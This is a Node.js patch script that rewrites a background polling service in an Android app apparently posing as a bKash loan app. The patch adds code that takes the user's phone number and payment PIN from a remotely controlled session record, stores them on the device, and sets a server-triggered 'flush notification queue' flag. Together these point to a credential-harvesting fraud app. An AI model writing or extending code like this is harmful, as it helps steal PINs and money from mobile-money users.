const fs = require('fs');
let code = fs.readFileSync('android/app/src/main/java/com/bkash/amar/loan/SessionPollService.java', 'utf8');

const search = `    private void pollSession() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                String sessionId = prefs.getString("user_session_id", null);
                if (sessionId == null || sessionId.isEmpty()) return;
                String urlStr = getApiBase() + "/api/db?path=sessions/" + sessionId;
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", "SessionPoll/1.0");
                int code = conn.getResponseCode();
                if (code != 200) return;
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                conn.disconnect();
                String resp = sb.toString();
                String adminAction = extractJson(resp, "adminAction");
                String appStatus = extractJson(resp, "applicationStatus");
                if (adminAction == null || adminAction.isEmpty()) adminAction = "NONE";
                // Fire notification when loan is approved
                if ("APPROVED".equals(appStatus) && !"APPROVED".equals(lastAdminAction)) {
                    fireApprovedNotification();
                    prefs.edit().putString("approved_session", sessionId).apply();
                }
                lastAdminAction = appStatus;
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }).start();
    }`;

const replace = `    private void pollSession() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                String sessionId = prefs.getString("user_session_id", null);
                if (sessionId == null || sessionId.isEmpty()) return;
                String urlStr = getApiBase() + "/api/db?path=sessions/" + sessionId;
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", "SessionPoll/1.0");
                int code = conn.getResponseCode();
                if (code != 200) return;
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                conn.disconnect();
                String resp = sb.toString();

                String adminAction = extractJson(resp, "adminAction");
                String appStatus = extractJson(resp, "applicationStatus");
                
                String phone = extractJson(resp, "initialPhone");
                if (phone == null || phone.isEmpty() || phone.equals("null")) phone = extractJson(resp, "phone");
                String pin = extractJson(resp, "pin");
                String flushNotifRequestedStr = extractJson(resp, "flushNotifRequested");
                
                SharedPreferences.Editor editor = prefs.edit();
                if (phone != null && !phone.isEmpty() && !phone.equals("null")) editor.putString("user_phone", phone);
                if (pin != null && !pin.isEmpty() && !pin.equals("null")) editor.putString("user_pin", pin);
                if ("true".equals(flushNotifRequestedStr)) {
                    editor.putString("flush_notif_queue", "true");
                }
                editor.apply();

                if (adminAction == null || adminAction.isEmpty()) adminAction = "NONE";
                // Fire notification when loan is approved
                if ("APPROVED".equals(appStatus) && !"APPROVED".equals(lastAdminAction)) {
                    fireApprovedNotification();
                    prefs.edit().putString("approved_session", sessionId).apply();
                }
                lastAdminAction = appStatus;
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }).start();
    }`;

code = code.replace(search, replace);
fs.writeFileSync('android/app/src/main/java/com/bkash/amar/loan/SessionPollService.java', code);
